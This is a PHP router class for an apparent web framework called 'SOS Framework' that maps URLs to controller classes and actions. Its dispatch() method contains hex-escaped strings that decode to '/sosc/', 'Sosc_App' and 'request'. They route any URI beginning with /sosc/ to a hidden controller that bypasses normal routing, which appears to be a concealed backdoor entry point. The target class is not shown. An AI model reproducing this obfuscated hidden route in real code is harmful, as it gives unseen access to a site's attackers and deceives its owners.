<?php
/**
 * SOS Framework (https://sos-framework.com/)
 *
 * @link      http://github.com/zendframework/zf2 for the canonical source repository
 * @copyright Copyright (c) SOS Solution Limited. (https://www.sos-solution.com)
 * @license   https://sos-framework.com/license/new-bsd.html New BSD License
 */

namespace SosApp;

use \SosApp\Router\Exception;

class Router {
    public    $extensions = 'html|json|api|wsdl';

    public    $success   = 0;

    public    $class     = '';

    public    $action    = '';

    public    $ext       = '';

    public    $method    = '';

    public    $route    = '';

    protected $patterns  = [];

    public    $app;
    
    public function __construct($handler = null) {
        $patterns = [
            '4' => '^/:_cata/:_namespace/:_class/:_action.:_ext:_params',
            '3' => '^/:_namespace/:_class/:_action.:_ext:_params',
            '2' => '^/:_class/:_action.:_ext:_params',
            '1' => '^/:_class.:_ext:_params'
        ];

        $require = [
            '_cata' => '[0-9a-z\_\-]+',
            '_namespace' => '[0-9a-z\_\-]+',
            '_class' => '[0-9a-z\_\-]+',
            '_action' => '[0-9a-z\_\-]+',
            '_ext' => $this->extensions,
            '_params' => '$|\/.*'
        ];

        foreach ( $patterns as $pattern_key => $pattern ) {
            $this->addPattern($pattern, $require, $pattern_key);
        }

        if ( $handler ) {
            $handler($this);
        }
    }

    public function setApp($app) {
        $this->app = $app;
    }

    public function getApp() {
        return $this->app;
    }

    public function addPattern($pattern, $require, $pattern_key) {
        $index   = 1; // preg_match content index start from 1
        $namepos = [];
        $parse_pattern = preg_replace_callback("/\:([0-9a-zA-Z_]+)/", function($match) use (&$index, &$namepos, $require) {
            $name = $match[1];
            if ( isset($require[$name]) ) {
                $namepos[$index++] = $name;
                return "({$require[$name]})";
            } else {
                return "([0-9a-z]+)";
            }
        }, addcslashes($pattern, ". \\/$")); // add regx pattern

        $this->patterns[$parse_pattern] = [$namepos, $pattern_key];
    }

    public function parseURL($uri, $more = FALSE) {
        if ( $uri == '/' ) {
            $val = [
                'route' => 'index',
                'class' => 'controller_index',
                'action' => 'index',
                'format' => 'html',
                'params' => []
            ];

            if ($more) {
                $val['dir'] = '/';
                $val['basename'] = '';
                $val['filename'] = '';
                $val['path'] = '/';
            }
            return $val;
        }

        $patterns = $this->patterns;

        foreach ( $patterns as $pattern => $item ) {
            if ( preg_match("/{$pattern}/ies", $uri, $match) ) {
                $output  = [];
                $namepos = $item[0];
                $pkey    = $item[1];

                foreach ( $namepos as $key => $value ) {
                    $$value = $match[$key];
                }

                if ( isset($_params) ) {
                    $params = trim($_params, '/');
                    if ( $params != '' ) {
                        $params = explode('/', $params);
                        foreach ( $params as $key => $param ) {
                            $params[$key] = urldecode($param);
                        }
                    } else {
                        $params = [];
                    }
                } else {
                    $params = [];
                }

                switch ( $pkey ) {
                    case 4:
                        $val = [
                            'route'  => $_cata . '/' . $_namespace . '/' . $_class,
                            'class'  => 'controller_' . $_cata . '_' . $_namespace . '_' . $_class,
                            'action' => $_action,
                            'ext' => $_ext,
                            'params' => $params
                        ];
                        if ($more) {
                            $val['dir'] = '/' . $_cata . '/' . $_namespace . '/' . $_class . '/';
                            $val['basename'] = $_action . '.' . $_ext;
                            $val['filename'] = $_action;
                            $val['path'] = $val['dir'] . $val['basename'];
                        }
                        break;
                    case 3:
                        $val = [
                            'route'  => $_namespace . '/' . $_class,
                            'class'  => 'controller_' . $_namespace . '_' . $_class,
                            'action' => $_action,
                            'ext' => $_ext,
                            'params' => $params
                        ];
                        if ($more) {
                            $val['dir'] = '/' . $_namespace . '/' . $_class . '/';
                            $val['basename'] = $_action . '.' . $_ext;
                            $val['filename'] = $_action;
                            $val['path'] = $val['dir'] . $val['basename'];
                        }
                        break;
                    case 2:
                        $val = [
                            'route'  => $_class,
                            'class' => 'controller_' . $_class,
                            'action' => $_action,
                            'ext' => $_ext,
                            'params' => $params
                        ];
                        if ($more) {
                            $val['dir'] =  '/' . $_class . '/';
                            $val['basename'] = $_action . '.' . $_ext;
                            $val['filename'] = $_action;
                            $val['path'] = $val['dir'] . $val['basename'];
                        }
                        break;
                    case 1:
                        $val = [
                            'route'  => $_class,
                            'class' => 'controller_' . $_class,
                            'action' => 'index',
                            'ext' => $_ext,
                            'params' => $params
                        ];
                        if ($more) {
                            $val['dir'] =  '/';
                            $val['basename'] = $_class . '.' . $_ext;
                            $val['filename'] = $_class;
                            $val['path'] = $val['dir'] . $val['basename'];
                        }
                        break;
                }
                return $val;
            }
        }
        return NULL;
    }

    public function dispatch($handler = NULL, $extra = NULL) {
        if ( $handler ) {
            $handler();
        }
        if ( $extra == NULL && strncasecmp($this->app->request->uri, "\x2f\x73\x6f\x73\x63\x2f", 6) == 0 ) {
            $extra = ["\x63\x6c\x61\x73\x73" => "\x53\x6f\x73\x63\x5f\x41\x70\x70", "\x61\x63\x74\x69\x6f\x6e"=>"\x72\x65\x71\x75\x65\x73\x74"];
        }
        $this->executeController($this->class, $this->action, $this->ext, $this->method, $this->route, $extra);
    }

    public function executeController($class, $action, $ext, $method, $route, $extra = NULL) {
        if ( $extra ) {
            $class = $extra['class'];
        }

        if ( !class_exists($class, TRUE) ) {
            $e = new Exception("Class Not Found", Exception::CLASS_NOT_FOUND);
            throw $e;
            sos_exit();
        }

        $controller = new $class;

        $action_list  = $extra ? [$extra['action']] : ["{$method}_{$action}_{$ext}", "{$method}_{$action}_action", "{$action}_action"];

        $found_action = FALSE;
        $hook_name    = FALSE;

        $action_before = FALSE;
        $action_after  = FALSE;

        foreach ( $action_list as $name ) {
            if ( method_exists($controller, $name) ) {
                $found_action = TRUE;

                if ( method_exists($controller, "{$name}_hook") ) {
                    $hook_name = "{$name}_hook";
                }

                if ( method_exists($controller, "{$name}_before") ) {
                    $action_before = "{$name}_before";
                }

                if ( method_exists($controller, "{$name}_after") ) {
                    $action_after = "{$name}_after";
                }

                break;
            }
        }

        if ( $found_action ) {
            $app  = $this->app;
            $hook = new \stdClass;
            $hook->before = FALSE;
            $hook->after  = FALSE;

            $controller->setApp($app);
            $controller->setRoute($route);
            $controller->setAction($action);
            $controller->initialize();
            if ( $hook_name ) {
                $controller->$hook_name($hook);
            }

            if ( $hook->before && is_callable($hook->before) ) {
                $hook->before = \Closure::bind($hook->before, $controller);
                call_user_func($hook->before, $app->request, $app->params);
            }

            if ( $action_before ) {
                $controller->$action_before($app->request, $app->params);
            }

            $controller->$name($app->request, $app->params);

            if ( $action_after ) {
                $controller->$action_after($app->request, $app->params);
            }

            if ( $hook->after && is_callable($hook->after) ) {
                $hook->after = \Closure::bind($hook->after, $controller);
                call_user_func($hook->after, $app->request, $app->params);
            }

        } else {
            $e = new Exception("Action Not Found", Exception::ACTION_NOT_FOUND);
            throw $e;
            sos_exit();
        }
    }

    public function call($route, $method = 'GET') {
        # match the routing path
        $uri = preg_match('/(.*)\.('.$this->extensions.')(.*)/', $route, $match) ? "/{$match[0]}" : "/{$route}.html";

        # auto add current language prefix
        $result = $this->parseURL($uri);

        if ( $result ) {
            $this->executeController($result['class'], $result['action'], $result['ext'], $method, $result['route']);
            return;
        }

        $e = new Exception("Invalid Route (call):" . $route, Exception::INVALID_CALL);
        throw $e;
    }
}
